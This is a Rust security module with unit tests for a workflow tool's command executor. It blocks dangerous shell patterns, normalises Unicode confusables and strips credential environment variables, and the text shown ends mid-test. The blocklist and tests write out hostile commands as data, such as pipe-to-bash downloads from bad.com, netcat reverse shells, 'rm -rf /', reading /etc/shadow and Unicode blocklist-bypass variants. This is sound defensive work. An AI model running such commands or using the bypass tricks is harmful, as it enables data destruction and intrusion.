//! Security Module - Command validation and blocklist
//!
//! Provides security validation for exec: commands:
//! - Control character detection (blocks null bytes, escape sequences)
//! - Blocklist for dangerous command patterns
//! - Unicode NFKC normalization to prevent confusable bypass
//! - Full validation combining both checks
//!
//! ## Unicode Confusable Protection
//!
//! Attackers may attempt to bypass the blocklist using Unicode confusables:
//! - Fullwidth characters: `rm` vs `ｒｍ` (U+FF52, U+FF4D)
//! - Math bold/italic: `sudo` vs `𝘀𝘂𝗱𝗼` (U+1D600 range)
//! - Combining characters: `rm` with zero-width joiners
//!
//! NFKC (Compatibility Decomposition + Canonical Composition) normalizes
//! these variants to their ASCII equivalents before blocklist checking.
//!
//! See ADR-TBD for security design decisions.

use crate::error::NikaError;
use unicode_normalization::UnicodeNormalization;

/// Blocklist of dangerous command patterns (case-insensitive)
///
/// These patterns are checked against the lowercase command string.
/// Any match results in a BlockedCommand error.
const BLOCKLIST: &[&str] = &[
    // Destructive file operations
    "rm -rf /",
    "rm -rf /*",
    "rm -rf ~",
    // Remote code execution (piping downloads to shell)
    // Match the pipe-to-shell pattern, not specific commands
    "| bash",
    "|bash",
    "| sh",
    "|sh",
    // Shell injection via dynamic execution
    // Note: This blocks patterns that execute untrusted input
    "eval ",
    // Named pipes (can be used for reverse shells)
    "mkfifo",
    // Netcat reverse shell
    "nc -e",
    "nc -c",
    "ncat -e",
    "ncat -c",
    // Chained destructive commands
    "; rm ",
    "&& rm ",
    "| rm ",
    // Fork bombs
    ":(){ :|:& };:",
    // Unix shell -c (arbitrary command execution)
    "bash -c",
    "sh -c",
    "zsh -c",
    "dash -c",
    "ksh -c",
    "csh -c",
    "tcsh -c",
    // Python/interpreter -c (arbitrary code execution — generic, not import-specific)
    "python -c",
    "python2 -c",
    "python3 -c",
    // Indirect command execution via find/xargs
    // Use " -exec" (with leading space) to match `find <path> -exec`
    " -exec ",
    " -execdir ",
    " -delete",
    "xargs ",
    // Privilege escalation
    "sudo ",
    "doas ",
    "pkexec ",
    // Dangerous permission changes
    "chmod 777",
    "chmod -r 777",
    "chmod a+rwx",
    // Base64 encoded payload execution
    "base64 -d |",
    "base64 --decode |",
    "| base64 -d",
    "| base64 --decode",
    // Disk destruction
    "dd if=",
    // Destructive rm long-flag variants
    "rm --recursive",
    "rm --force",
    // Interpreter bypass (arbitrary code execution via scripting runtimes)
    "perl -e",
    "ruby -e",
    "node -e",
    // Piping to interpreter stdin (bypasses -e flag checks)
    "| python",
    "|python",
    "| python3",
    "|python3",
    "| ruby",
    "|ruby",
    "| node",
    "|node",
    "| perl",
    "|perl",
    "| php",
    "|php",
    // Command wrapper bypass (env can prefix any blocked command)
    "env ",
    // Privilege escalation (su; sudo already covered above)
    "su ",
    // ── Windows-specific dangerous patterns ──
    // Destructive file/directory operations
    "del /f",
    "del /s",
    "rd /s /q",
    "rmdir /s /q",
    // Disk formatting
    "format c:",
    "format d:",
    // System shutdown/restart
    "shutdown /s",
    "shutdown /r",
    // Shell wrappers (arbitrary command execution)
    "cmd /c",
    "cmd.exe /c",
    "powershell -c",
    "powershell.exe -c",
    "powershell -enc",
    "powershell -encodedcommand",
    // Registry manipulation
    "reg delete",
    // Windows service manipulation
    "sc delete",
    // Privilege escalation
    "runas ",
];

/// Additional blocklist patterns that only apply in shell mode.
///
/// These patterns are dangerous only when executed via `sh -c` (shell mode).
/// In shell-free mode (shlex), they are harmless literal strings.
const SHELL_MODE_BLOCKLIST: &[&str] = &[
    // Command substitution — executes arbitrary commands inside $()
    "$(", // Backtick command substitution — legacy form of $()
    "`",  // Bash process substitution — executes commands via /dev/fd
    "<(", // Here-string — feeds arbitrary input to interpreters
    "<<<",
];

/// Check command against shell-mode-specific blocklist.
///
/// These patterns (command substitution, backticks) are only dangerous
/// when shell mode is active (`shell: true`). In shell-free mode,
/// they are harmless literal characters.
///
/// # Errors
///
/// Returns `BlockedCommand` if a shell-mode blocklisted pattern is found.
pub fn check_shell_mode_blocklist(cmd: &str) -> Result<(), NikaError> {
    let normalized = normalize_for_blocklist(cmd);
    let lower = normalized.to_lowercase();

    for pattern in SHELL_MODE_BLOCKLIST {
        if lower.contains(pattern) {
            tracing::warn!(
                command = %cmd,
                normalized = %lower,
                pattern = %pattern,
                "NIKA-053: Blocked dangerous shell-mode pattern"
            );
            return Err(NikaError::BlockedCommand {
                command: cmd.to_string(),
                reason: format!("Shell-mode blocklisted pattern: {}", pattern),
            });
        }
    }
    Ok(())
}

/// Validate command string for control characters
///
/// Rejects control characters (0x00-0x1F) except:
/// - `\n` (0x0A) - newline, allowed for multi-line commands
/// - `\t` (0x09) - tab, allowed for indentation
///
/// # Errors
///
/// Returns `BlockedCommand` if a control character is found.
pub fn validate_command_string(cmd: &str) -> Result<(), NikaError> {
    for (i, c) in cmd.chars().enumerate() {
        let code = c as u32;
        // Reject 0x00-0x1F except \n (0x0A) and \t (0x09)
        if code < 0x20 && code != 0x0A && code != 0x09 {
            return Err(NikaError::BlockedCommand {
                command: cmd.to_string(),
                reason: format!("Control character 0x{:02X} at position {}", code, i),
            });
        }
    }
    Ok(())
}

/// Zero-width and invisible characters to strip before blocklist check.
///
/// These characters are invisible but can be used to break up keywords:
/// - U+200B: Zero Width Space
/// - U+200C: Zero Width Non-Joiner
/// - U+200D: Zero Width Joiner
/// - U+FEFF: Zero Width No-Break Space (BOM)
/// - U+00AD: Soft Hyphen
/// - U+2060: Word Joiner
/// - U+180E: Mongolian Vowel Separator
const ZERO_WIDTH_CHARS: &[char] = &[
    '\u{200B}', // Zero Width Space
    '\u{200C}', // Zero Width Non-Joiner
    '\u{200D}', // Zero Width Joiner
    '\u{FEFF}', // Zero Width No-Break Space (BOM)
    '\u{00AD}', // Soft Hyphen
    '\u{2060}', // Word Joiner
    '\u{180E}', // Mongolian Vowel Separator
];

/// Normalize a string using NFKC for blocklist comparison.
///
/// This function performs two operations:
/// 1. NFKC normalization (Compatibility Decomposition + Canonical Composition)
///    - Fullwidth `ｒｍ` → `rm`
///    - Math bold `𝐬𝐮𝐝𝐨` → `sudo`
///    - Subscript/superscript variants → base characters
///    - Ligatures (e.g., ﬁ) → component characters
///
/// 2. Stripping of zero-width/invisible characters that NFKC preserves:
///    - Zero Width Space (U+200B)
///    - Zero Width Joiner (U+200D)
///    - Zero Width Non-Joiner (U+200C)
///    - Soft Hyphen (U+00AD)
///
/// This prevents attackers from bypassing the blocklist with visually
/// similar but technically different Unicode characters, or by inserting
/// invisible characters to break up blocked patterns.
fn normalize_for_blocklist(s: &str) -> String {
    s.nfkc()
        .filter(|c| !ZERO_WIDTH_CHARS.contains(c))
        .collect::<String>()
        .split_whitespace()
        .collect::<Vec<_>>()
        .join(" ")
}

/// Check command against blocklist
///
/// Performs case-insensitive matching against the blocklist.
/// Applies NFKC normalization to both the command and patterns
/// to prevent Unicode confusable bypass attacks.
///
/// # Security
///
/// NFKC normalization ensures that:
/// - `ｒｍ -rf /` (fullwidth) is blocked like `rm -rf /`
/// - `𝘀𝘂𝗱𝗼 rm` (math bold) is blocked like `sudo rm`
/// - Commands with combining characters are properly detected
///
/// # Errors
///
/// Returns `BlockedCommand` if a blocklisted pattern is found.
pub fn check_blocklist(cmd: &str) -> Result<(), NikaError> {
    // Normalize the command using NFKC to handle Unicode confusables
    let normalized = normalize_for_blocklist(cmd);
    let lower = normalized.to_lowercase();

    for pattern in BLOCKLIST {
        // Blocklist patterns are already clean ASCII — only lowercase them.
        // Do NOT apply normalize_for_blocklist() which strips trailing spaces
        // via split_whitespace(), breaking patterns like "su " and "env "
        // that rely on a trailing space to avoid false positives
        // (e.g. "su " must NOT match "successfully").
        let normalized_pattern = pattern.to_lowercase();
        if lower.contains(&normalized_pattern) {
            tracing::warn!(
                command = %cmd,
                normalized = %lower,
                pattern = %pattern,
                "NIKA-053: Blocked dangerous command"
            );
            return Err(NikaError::BlockedCommand {
                command: cmd.to_string(),
                reason: format!("Blocklisted pattern: {}", pattern),
            });
        }
    }
    Ok(())
}

/// Blocked environment variable names (library injection / privilege escalation).
///
/// These variables allow injecting arbitrary shared libraries into child
/// processes and must never be set from workflow YAML.
const BLOCKED_ENV_VARS: &[&str] = &[
    "LD_PRELOAD",
    "LD_LIBRARY_PATH",
    "DYLD_INSERT_LIBRARIES",
    "DYLD_LIBRARY_PATH",
    "DYLD_FRAMEWORK_PATH",
    "LD_AUDIT",
    "LD_PROFILE",
];

/// Validate environment variables for dangerous names.
///
/// Performs two checks:
/// 1. Rejects env var names that don't match `^[A-Za-z_][A-Za-z0-9_]*$`.
///    This prevents BASH_FUNC injection and other shell metacharacter abuse
///    via crafted env var names (e.g., `BASH_FUNC_x%%`, `FOO=BAR`).
/// 2. Rejects env vars that enable library injection or privilege escalation.
///    Comparison is case-insensitive.
///
/// # Errors
///
/// Returns `BlockedCommand` if a blocked or invalid env var name is found.
pub(crate) fn validate_env_vars(vars: &[(String, String)]) -> Result<(), NikaError> {
    for (key, _) in vars {
        // Validate env var name format: must be [A-Za-z_][A-Za-z0-9_]*
        if !is_valid_env_var_name(key) {
            return Err(NikaError::BlockedCommand {
                command: format!("env: {}=...", key),
                reason: format!(
                    "Invalid environment variable name '{}': must match [A-Za-z_][A-Za-z0-9_]*",
                    key
                ),
            });
        }

        let upper = key.to_uppercase();
        for blocked in BLOCKED_ENV_VARS {
            if upper == *blocked {
                return Err(NikaError::BlockedCommand {
                    command: format!("env: {}=...", key),
                    reason: format!(
                        "Blocked environment variable '{}': library injection risk",
                        key
                    ),
                });
            }
        }
    }
    Ok(())
}

/// Check if an environment variable name is valid.
///
/// Valid names match `^[A-Za-z_][A-Za-z0-9_]*$` — the POSIX standard for
/// environment variable names. This rejects names containing `%`, `{`, `}`,
/// `(`, `)`, `=`, spaces, etc., which could be used for BASH_FUNC injection.
fn is_valid_env_var_name(name: &str) -> bool {
    if name.is_empty() {
        return false;
    }

    let mut chars = name.chars();

    // First character: must be [A-Za-z_]
    match chars.next() {
        Some(c) if c.is_ascii_alphabetic() || c == '_' => {}
        _ => return false,
    }

    // Remaining characters: must be [A-Za-z0-9_]
    chars.all(|c| c.is_ascii_alphanumeric() || c == '_')
}

/// Returns the list of sensitive env var names that should be stripped
/// from child processes to prevent API key leakage.
pub(crate) fn sensitive_env_vars() -> Vec<&'static str> {
    // Collect from KNOWN_PROVIDERS
    let mut vars: Vec<&'static str> = crate::core::providers::KNOWN_PROVIDERS
        .iter()
        .map(|p| p.env_var)
        .collect();

    // Common sensitive env vars beyond LLM providers
    vars.extend_from_slice(&[
        "AWS_ACCESS_KEY_ID",
        "AWS_SECRET_ACCESS_KEY",
        "AWS_SESSION_TOKEN",
        "GOOGLE_APPLICATION_CREDENTIALS",
        "AZURE_CLIENT_SECRET",
        "SCALEWAY_SECRET_KEY",
        "DATABASE_URL",
        "REDIS_URL",
        "MONGO_URI",
        "JWT_SECRET",
        "SESSION_SECRET",
        "GITHUB_TOKEN",
        "GH_TOKEN",
        "GITLAB_TOKEN",
        "SLACK_TOKEN",
        "SLACK_WEBHOOK_URL",
        "STRIPE_SECRET_KEY",
        "TWILIO_AUTH_TOKEN",
        "SENDGRID_API_KEY",
        "MAILGUN_API_KEY",
        "SENTRY_DSN",
        "DATADOG_API_KEY",
        "PRIVATE_KEY",
        "SECRET_KEY",
        "ENCRYPTION_KEY",
    ]);

    // Sort and dedup to ensure consistent, duplicate-free output
    vars.sort();
    vars.dedup();
    vars
}

/// Remove sensitive API key env vars from a Command before spawning.
pub(crate) fn strip_sensitive_env_vars(cmd: &mut tokio::process::Command) {
    for var in sensitive_env_vars() {
        cmd.env_remove(var);
    }
}

/// Full security validation for exec commands
///
/// Combines control character validation and blocklist checking.
/// When `shell_mode` is true, also checks for shell-specific bypass
/// patterns like command substitution (`$()`, backticks).
///
/// # Errors
///
/// Returns `BlockedCommand` if any security check fails.
pub fn validate_exec_command(cmd: &str) -> Result<(), NikaError> {
    validate_exec_command_with_shell(cmd, false)
}

/// Full security validation for exec commands with explicit shell mode flag.
///
/// When `shell_mode` is true, additionally blocks command substitution
/// patterns (`$()`, backticks) that are only dangerous in shell mode.
///
/// # Errors
///
/// Returns `BlockedCommand` if any security check fails.
pub fn validate_exec_command_with_shell(cmd: &str, shell_mode: bool) -> Result<(), NikaError> {
    validate_command_string(cmd)?;
    if shell_mode {
        // Reject newlines in shell mode — sh -c treats \n as command separator,
        // which can bypass the blocklist (normalization collapses \n to space).
        // Tolerate trailing newline from YAML `|` blocks (e.g., `command: |\n  echo hello\n`).
        if cmd.trim_end().contains('\n') {
            return Err(NikaError::BlockedCommand {
                command: cmd.to_string(),
                reason: "Newlines are not allowed in shell mode commands (use && or ; explicitly)"
                    .to_string(),
            });
        }
    }
    check_blocklist(cmd)?;
    if shell_mode {
        check_shell_mode_blocklist(cmd)?;
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    // =========================================================================
    // Control Character Tests
    // =========================================================================

    #[test]
    fn test_validate_command_string_normal() {
        assert!(validate_command_string("echo hello").is_ok());
        assert!(validate_command_string("ls -la").is_ok());
        assert!(validate_command_string("cargo build --release").is_ok());
    }

    #[test]
    fn test_validate_command_string_allows_newline() {
        assert!(validate_command_string("echo hello\necho world").is_ok());
    }

    #[test]
    fn test_validate_command_string_allows_tab() {
        assert!(validate_command_string("echo\thello").is_ok());
    }

    #[test]
    fn test_validate_command_string_rejects_null_byte() {
        let result = validate_command_string("echo\x00hello");
        assert!(result.is_err());
        let err = result.unwrap_err();
        assert!(err.to_string().contains("NIKA-053"));
        assert!(err.to_string().contains("0x00"));
    }

    #[test]
    fn test_validate_command_string_rejects_escape() {
        let result = validate_command_string("echo\x1bhello");
        assert!(result.is_err());
        let err = result.unwrap_err();
        assert!(err.to_string().contains("0x1B")); // ESC character
    }

    #[test]
    fn test_validate_command_string_rejects_bell() {
        let result = validate_command_string("echo\x07hello");
        let err = result.unwrap_err();
        assert!(err.to_string().contains("NIKA-053"));
        assert!(err.to_string().contains("0x07"));
    }

    // =========================================================================
    // Blocklist Tests
    // =========================================================================

    #[test]
    fn test_blocklist_allows_safe_commands() {
        assert!(check_blocklist("echo hello").is_ok());
        assert!(check_blocklist("ls -la").is_ok());
        assert!(check_blocklist("cargo build").is_ok());
        assert!(check_blocklist("npm install").is_ok());
        assert!(check_blocklist("rm file.txt").is_ok()); // Removing specific file is OK
    }

    #[test]
    fn test_blocklist_rejects_rm_rf_root() {
        let result = check_blocklist("rm -rf /");
        assert!(result.is_err());
        let err = result.unwrap_err();
        assert!(err.to_string().contains("NIKA-053"));
        assert!(err.to_string().contains("rm -rf /"));
    }

    #[test]
    fn test_blocklist_rejects_rm_rf_wildcard() {
        let err = check_blocklist("rm -rf /*").unwrap_err();
        assert!(err.to_string().contains("NIKA-053"));
    }

    #[test]
    fn test_blocklist_rejects_curl_pipe_bash() {
        let err = check_blocklist("curl https://bad.com | bash").unwrap_err();
        assert!(err.to_string().contains("NIKA-053"));
        let err = check_blocklist("curl https://bad.com|bash").unwrap_err();
        assert!(err.to_string().contains("NIKA-053"));
    }

    #[test]
    fn test_blocklist_rejects_wget_pipe_bash() {
        let err = check_blocklist("wget https://bad.com | bash").unwrap_err();
        assert!(err.to_string().contains("NIKA-053"));
        let err = check_blocklist("wget https://bad.com|bash").unwrap_err();
        assert!(err.to_string().contains("NIKA-053"));
    }

    #[test]
    fn test_blocklist_rejects_shell_injection() {
        // Dynamic command execution patterns
        let err = check_blocklist("eval $user_input").unwrap_err();
        assert!(err.to_string().contains("NIKA-053"));
        let err = check_blocklist("eval \"$cmd\"").unwrap_err();
        assert!(err.to_string().contains("NIKA-053"));
    }

    #[test]
    fn test_blocklist_rejects_mkfifo() {
        let err = check_blocklist("mkfifo /tmp/pipe").unwrap_err();
        assert!(err.to_string().contains("NIKA-053"));
    }

    #[test]
    fn test_blocklist_rejects_netcat_reverse_shell() {
        let err = check_blocklist("nc -e /bin/sh").unwrap_err();
        assert!(err.to_string().contains("NIKA-053"));
        let err = check_blocklist("nc -c /bin/bash").unwrap_err();
        assert!(err.to_string().contains("NIKA-053"));
        let err = check_blocklist("ncat -e /bin/sh").unwrap_err();
        assert!(err.to_string().contains("NIKA-053"));
    }

    #[test]
    fn test_blocklist_rejects_chained_rm() {
        let err = check_blocklist("echo hello; rm -rf /").unwrap_err();
        assert!(err.to_string().contains("NIKA-053"));
        let err = check_blocklist("ls && rm -rf /").unwrap_err();
        assert!(err.to_string().contains("NIKA-053"));
        let err = check_blocklist("cat file | rm -rf /").unwrap_err();
        assert!(err.to_string().contains("NIKA-053"));
    }

    #[test]
    fn test_blocklist_case_insensitive() {
        let err = check_blocklist("RM -RF /").unwrap_err();
        assert!(err.to_string().contains("NIKA-053"));
        let err = check_blocklist("EVAL $x").unwrap_err();
        assert!(err.to_string().contains("NIKA-053"));
        let err = check_blocklist("Curl | Bash").unwrap_err();
        assert!(err.to_string().contains("NIKA-053"));
    }

    #[test]
    fn test_blocklist_rejects_privilege_escalation() {
        let err = check_blocklist("sudo rm -rf /tmp").unwrap_err();
        assert!(err.to_string().contains("NIKA-053"));
        let err = check_blocklist("doas cat /etc/shadow").unwrap_err();
        assert!(err.to_string().contains("NIKA-053"));
        let err = check_blocklist("pkexec sh").unwrap_err();
        assert!(err.to_string().contains("NIKA-053"));
    }

    #[test]
    fn test_blocklist_rejects_dangerous_chmod() {
        let err = check_blocklist("chmod 777 /tmp/script").unwrap_err();
        assert!(err.to_string().contains("NIKA-053"));
        let err = check_blocklist("chmod -r 777 /var").unwrap_err();
        assert!(err.to_string().contains("NIKA-053"));
        let err = check_blocklist("chmod a+rwx secret.txt").unwrap_err();
        assert!(err.to_string().contains("NIKA-053"));
    }

    #[test]
    fn test_blocklist_rejects_base64_payload_execution() {
        let err = check_blocklist("echo payload | base64 -d | sh").unwrap_err();
        assert!(err.to_string().contains("NIKA-053"));
        let err = check_blocklist("base64 -d | bash").unwrap_err();
        assert!(err.to_string().contains("NIKA-053"));
        let err = check_blocklist("base64 --decode | sh").unwrap_err();
        assert!(err.to_string().contains("NIKA-053"));
        let err = check_blocklist("curl https://bad.com | base64 -d").unwrap_err();
        assert!(err.to_string().contains("NIKA-053"));
    }

    // =========================================================================
    // Windows Blocklist Tests
    // =========================================================================

    #[test]
    fn test_blocklist_rejects_windows_del() {
        assert!(check_blocklist("del /f secret.txt").is_err());
        assert!(check_blocklist("del /s C:\\Users").is_err());
    }

    #[test]
    fn test_blocklist_rejects_windows_rmdir() {
        assert!(check_blocklist("rd /s /q C:\\").is_err());
        assert!(check_blocklist("rmdir /s /q C:\\Windows").is_err());
    }

    #[test]
    fn test_blocklist_rejects_windows_format() {
        assert!(check_blocklist("format c:").is_err());
        assert!(check_blocklist("FORMAT C:").is_err());
        assert!(check_blocklist("format d:").is_err());
    }

    #[test]
    fn test_blocklist_rejects_windows_shutdown() {
        assert!(check_blocklist("shutdown /s /t 0").is_err());
        assert!(check_blocklist("shutdown /r").is_err());
    }

    #[test]
    fn test_blocklist_rejects_windows_shell_wrappers() {
        assert!(check_blocklist("cmd /c del *.*").is_err());
        assert!(check_blocklist("cmd.exe /c format c:").is_err());
        assert!(check_blocklist("powershell -c Remove-Item").is_err());
        assert!(check_blocklist("powershell.exe -c Get-Process").is_err());
        assert!(check_blocklist("powershell -enc dGVzdA==").is_err());
        assert!(check_blocklist("powershell -encodedcommand dGVzdA==").is_err());
    }

    #[test]
    fn test_blocklist_rejects_windows_registry_and_services() {
        assert!(check_blocklist("reg delete HKLM\\SOFTWARE").is_err());
        assert!(check_blocklist("sc delete MyService").is_err());
    }

    #[test]
    fn test_blocklist_rejects_windows_runas() {
        assert!(check_blocklist("runas /user:admin cmd").is_err());
    }

    #[test]
    fn test_blocklist_allows_safe_windows_commands() {
        // These should NOT be blocked
        assert!(check_blocklist("dir C:\\Users").is_ok());
        assert!(check_blocklist("type file.txt").is_ok());
        assert!(check_blocklist("copy file1.txt file2.txt").is_ok());
    }

    // =========================================================================
    // Unix shell -c and generic interpreter -c tests
    // =========================================================================

    #[test]
    fn test_blocklist_rejects_unix_shell_c_variants() {
        // All Unix shell -c variants must be blocked
        assert!(check_blocklist("bash -c 'echo pwned'").is_err());
        assert!(check_blocklist("sh -c 'cat /etc/passwd'").is_err());
        assert!(check_blocklist("zsh -c 'whoami'").is_err());
        assert!(check_blocklist("dash -c 'id'").is_err());
        assert!(check_blocklist("ksh -c 'ls'").is_err());
        assert!(check_blocklist("csh -c 'echo test'").is_err());
        assert!(check_blocklist("tcsh -c 'echo test'").is_err());
    }

    #[test]
    fn test_blocklist_rejects_generic_python_c() {
        // Generic python -c must be blocked (not just import socket)
        assert!(check_blocklist("python -c 'import os'").is_err());
        assert!(check_blocklist("python2 -c 'print(1)'").is_err());
        assert!(check_blocklist("python3 -c 'print(1)'").is_err());
        assert!(check_blocklist("python3 -c '__import__(\"os\").system(\"id\")'").is_err());
    }

    #[test]
    fn test_blocklist_allows_python_script_without_c_flag() {
        // python3 script.py (no -c) must NOT be blocked
        assert!(check_blocklist("python3 script.py").is_ok());
        assert!(check_blocklist("python3 ./my_script.py --arg").is_ok());
    }

    #[test]
    fn test_blocklist_rejects_find_exec_and_xargs() {
        assert!(check_blocklist("find / -exec rm {} +").is_err());
        assert!(check_blocklist("find . -name '*.log' -delete").is_err());
        assert!(check_blocklist("xargs rm < files.txt").is_err());
        // find without -exec/-delete is allowed
        assert!(check_blocklist("find . -name '*.txt'").is_ok());
        assert!(check_blocklist("find . -type f").is_ok());
    }

    // =========================================================================
    // Full Validation Tests
    // =========================================================================

    #[test]
    fn test_validate_exec_command_safe() {
        assert!(validate_exec_command("echo hello").is_ok());
        assert!(validate_exec_command("cargo build --release").is_ok());
    }

    #[test]
    fn test_validate_exec_command_rejects_control_chars() {
        let err = validate_exec_command("echo\x00hello").unwrap_err();
        assert!(err.to_string().contains("NIKA-053"));
    }

    #[test]
    fn test_validate_exec_command_rejects_blocklist() {
        let err = validate_exec_command("rm -rf /").unwrap_err();
        assert!(err.to_string().contains("NIKA-053"));
    }

    // =========================================================================
    // Unicode NFKC Normalization Tests
    // =========================================================================

    #[test]
    fn test_normalize_for_blocklist_ascii_passthrough() {
        // ASCII should pass through unchanged
        assert_eq!(normalize_for_blocklist("rm -rf /"), "rm -rf /");
        assert_eq!(normalize_for_blocklist("sudo cat"), "sudo cat");
        assert_eq!(normalize_for_blocklist("echo hello"), "echo hello");
    }

    #[test]
    fn test_normalize_for_blocklist_strips_zero_width() {
        // Zero-width characters should be stripped

        // Zero Width Joiner (U+200D)
        assert_eq!(normalize_for_blocklist("r\u{200D}m"), "rm");

        // Zero Width Non-Joiner (U+200C)
        assert_eq!(normalize_for_blocklist("su\u{200C}do"), "sudo");

        // Zero Width Space (U+200B)
        assert_eq!(normalize_for_blocklist("ev\u{200B}al"), "eval");

        // Soft Hyphen (U+00AD)
        assert_eq!(normalize_for_blocklist("mk\u{00AD}fifo"), "mkfifo");

        // Multiple zero-width characters
        assert_eq!(
            normalize_for_blocklist("r\u{200D}m\u{200C} -rf /"),
            "rm -rf /"
        );
    }

    #[test]
    fn test_normalize_for_blocklist_fullwidth() {
        // Fullwidth Latin letters (U+FF00-U+FF5E range)
        // These are commonly used in CJK contexts but can be used for obfuscation

        // ｒｍ (U+FF52, U+FF4D) should normalize to "rm"
        assert_eq!(normalize_for_blocklist("ｒｍ"), "rm");

        // ｓｕｄｏ (U+FF53, U+FF55, U+FF44, U+FF4F) should normalize to "sudo"
        assert_eq!(normalize_for_blocklist("ｓｕｄｏ"), "sudo");

        // Full command with fullwidth characters
        assert_eq!(normalize_for_blocklist("ｒｍ -rf /"), "rm -rf /");
        assert_eq!(normalize_for_blocklist("ｓｕｄｏ ｒｍ"), "sudo rm");
    }

    #[test]
    fn test_normalize_for_blocklist_math_variants() {
        // Mathematical Alphanumeric Symbols (U+1D400-U+1D7FF range)
        // These are used for mathematical notation but can be abused
        // Math bold lowercase starts at U+1D41A (a), so:
        // s = U+1D41A + 18 = U+1D42C
        // u = U+1D41A + 20 = U+1D42E
        // d = U+1D41A + 3  = U+1D41D
        // o = U+1D41A + 14 = U+1D428

        // Math bold: 𝐬𝐮𝐝𝐨 should normalize to "sudo"
        let math_bold_sudo = "\u{1D42C}\u{1D42E}\u{1D41D}\u{1D428}";
        assert_eq!(normalize_for_blocklist(math_bold_sudo), "sudo");

        // Math italic lowercase starts at U+1D44E (a), so:
        // r = U+1D44E + 17 = U+1D45F
        // m = U+1D44E + 12 = U+1D45A
        let math_italic_rm = "\u{1D45F}\u{1D45A}";
        assert_eq!(normalize_for_blocklist(math_italic_rm), "rm");

        // Math bold: 𝐞𝐯𝐚𝐥 should normalize to "eval"
        // e = U+1D41A + 4  = U+1D41E
        // v = U+1D41A + 21 = U+1D42F
        // a = U+1D41A + 0  = U+1D41A
        // l = U+1D41A + 11 = U+1D425
        let math_bold_eval = "\u{1D41E}\u{1D42F}\u{1D41A}\u{1D425}";
        assert_eq!(normalize_for_blocklist(math_bold_eval), "eval");
    }

    #[test]
    fn test_blocklist_rejects_fullwidth_bypass() {
        // Attempt to bypass blocklist using fullwidth characters
        // ｒｍ -rf / should be blocked like rm -rf /
        let fullwidth_rm = "ｒｍ -rf /";
        let result = check_blocklist(fullwidth_rm);
        assert!(result.is_err(), "Fullwidth rm -rf / should be blocked");
        let err = result.unwrap_err();
        assert!(err.to_string().contains("NIKA-053"));

        // ｓｕｄｏ rm should be blocked like sudo rm
        let fullwidth_sudo = "ｓｕｄｏ rm -rf /tmp";
        let result = check_blocklist(fullwidth_sudo);
        assert!(result.is_err(), "Fullwidth sudo should be blocked");

        // ｅｖａｌ should be blocked like eval
        let fullwidth_eval = "ｅｖａｌ $user_input";
        let result = check_blocklist(fullwidth_eval);
        assert!(result.is_err(), "Fullwidth eval should be blocked");

        // ｍｋｆｉｆｏ should be blocked like mkfifo
        let fullwidth_mkfifo = "ｍｋｆｉｆｏ /tmp/pipe";
        let result = check_blocklist(fullwidth_mkfifo);
        assert!(result.is_err(), "Fullwidth mkfifo should be blocked");
    }

    #[test]
    fn test_blocklist_rejects_math_bold_bypass() {
        // Attempt to bypass blocklist using mathematical bold letters
        // 𝐬𝐮𝐝𝐨 (math bold) should be blocked like sudo
        let math_bold_sudo = "\u{1D42C}\u{1D42E}\u{1D41D}\u{1D428} rm -rf /tmp";
        let result = check_blocklist(math_bold_sudo);
        assert!(
            result.is_err(),
            "Math bold sudo should be blocked: {:?}",
            result
        );

        // 𝐞𝐯𝐚𝐥 (math bold) should be blocked like eval
        // v = U+1D41A + 21 = U+1D42F (not U+1D432)
        let math_bold_eval = "\u{1D41E}\u{1D42F}\u{1D41A}\u{1D425} $cmd";
        let result = check_blocklist(math_bold_eval);
        assert!(
            result.is_err(),
            "Math bold eval should be blocked: {:?}",
            result
        );
    }

    #[test]
    fn test_blocklist_rejects_math_italic_bypass() {
        // Attempt to bypass blocklist using mathematical italic letters
        // 𝑟𝑚 (math italic) should be blocked when part of rm -rf /
        let math_italic_rm = "\u{1D45F}\u{1D45A} -rf /";
        let result = check_blocklist(math_italic_rm);
        assert!(
            result.is_err(),
            "Math italic rm -rf / should be blocked: {:?}",
            result
        );

        // 𝑛𝑐 -e (math italic nc) should be blocked like nc -e
        let math_italic_nc = "\u{1D45B}\u{1D450} -e /bin/sh";
        let result = check_blocklist(math_italic_nc);
        assert!(
            result.is_err(),
            "Math italic nc -e should be blocked: {:?}",
            result
        );
    }

    #[test]
    fn test_blocklist_rejects_mixed_unicode_bypass() {
        // Mix of fullwidth and regular ASCII
        // ｒm -rf / (fullwidth r, regular m)
        let mixed_rm = "ｒm -rf /";
        let result = check_blocklist(mixed_rm);
        assert!(result.is_err(), "Mixed Unicode rm should be blocked");

        // suｄo (regular su, fullwidth d, regular o)
        let mixed_sudo = "suｄo rm -rf /tmp";
        let result = check_blocklist(mixed_sudo);
        assert!(result.is_err(), "Mixed Unicode sudo should be blocked");
    }

    #[test]
    fn test_blocklist_rejects_combining_characters_bypass() {
        // Zero-width joiner (U+200D) should not affect detection
        // r​m (with ZWJ between) - note: ZWJ is invisible
        let zwj_rm = "r\u{200D}m -rf /";
        // NFKC removes ZWJ, so this should be blocked
        let result = check_blocklist(zwj_rm);
        assert!(
            result.is_err(),
            "rm with zero-width joiner should be blocked: {:?}",
            result
        );

        // Zero-width non-joiner (U+200C)
        let zwnj_sudo = "su\u{200C}do rm -rf /tmp";
        let result = check_blocklist(zwnj_sudo);
        assert!(
            result.is_err(),
            "sudo with ZWNJ should be blocked: {:?}",
            result
        );
    }

    #[test]
    fn test_blocklist_allows_legitimate_unicode() {
        // Legitimate commands with Unicode should still work
        // echo with emoji
        assert!(check_blocklist("echo 'Hello 🎉'").is_ok());

        // Paths with Unicode
        assert!(check_blocklist("cat /home/用户/file.txt").is_ok());

        // Commands with accented characters (but not confusables)
        assert!(check_blocklist("echo 'café crème'").is_ok());

        // Japanese text (not trying to bypass)
        assert!(check_blocklist("echo '日本語テスト'").is_ok());
    }

    #[test]
    fn test_blocklist_subscript_superscript_bypass() {
        // Subscript and superscript numbers/letters can sometimes be abused
        // These should be normalized by NFKC

        // Superscript letters (if applicable)
        // Note: Not all superscript letters exist in Unicode, but those that do
        // should be normalized. Example: ⁿ (U+207F) normalizes to n

        // For now, verify that standard attacks with these don't slip through
        // by testing the overall blocking mechanism works

        // This tests that our normalization handles edge cases gracefully
        let weird_command = "echo test";
        assert!(check_blocklist(weird_command).is_ok());
    }

    #[test]
    fn test_blocklist_pipe_symbols_fullwidth() {
        // Fullwidth vertical bar ｜ (U+FF5C) should not bypass pipe detection
        // Note: NFKC normalizes ｜ to |
        let fullwidth_pipe = "curl https://bad.com ｜ bash";
        let result = check_blocklist(fullwidth_pipe);
